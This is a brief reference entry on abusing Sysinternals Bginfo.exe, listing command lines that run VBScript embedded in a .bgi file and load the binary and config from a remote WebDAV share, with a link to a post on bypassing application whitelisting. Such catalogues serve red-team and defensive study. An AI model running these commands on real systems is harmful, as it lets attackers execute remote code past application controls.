## Bginfo.exe
* Functions: Execute
```

bginfo.exe bginfo.bgi /popup /nolicprompt
Execute VBscript code that is referenced within the bginfo.bgi file.

"\\10.10.10.10\webdav\bginfo.exe" bginfo.bgi /popup /nolicprompt
Execute bginfo.exe from a WebDAV server.

"\\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
This style of execution may not longer work due to patch.
```
   
* Resources:   
  * https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
   
* Full path:   
  * No fixed path
   
* Notes: Thanks to Oddvar Moe - @oddvarmoe  
   
